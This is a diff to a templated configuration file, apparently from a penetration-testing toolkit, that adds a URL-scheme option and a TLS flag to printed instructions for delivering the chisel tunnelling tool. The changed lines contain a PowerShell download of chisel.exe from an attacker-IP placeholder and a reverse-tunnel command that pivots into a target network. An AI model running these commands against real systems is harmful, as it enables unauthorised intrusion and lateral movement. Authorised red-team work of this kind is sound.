@@ -18,8 +18,8 @@ content: |
   printf '%s\n' 'Start reverse proxy: ./chisel server -p {{ proxy_port }} --reverse'; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                      -----PowerShell-----                      '; \
-  printf '%s\n' 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/chisel.exe -Outfile {{ delivery_path_windows }}\chisel.exe'; \
+  printf '%s\n' 'Deliver only: iwr -uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/chisel.exe -Outfile {{ delivery_path_windows }}\chisel.exe'; \
   printf '%s\n' "To run: {{ delivery_path_windows }}\chisel.exe client {{ attacker_ip }}:{{ proxy_port }} R:$kali_port:$target:$target_port"; \
   printf '%s\n' "Expected Result: You should be able to reach $target:$target_$port on 127.0.0.1:$kali_port"; \
   printf '%s\n' '================================================================'; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }} {{ delivery_tls_flag }}
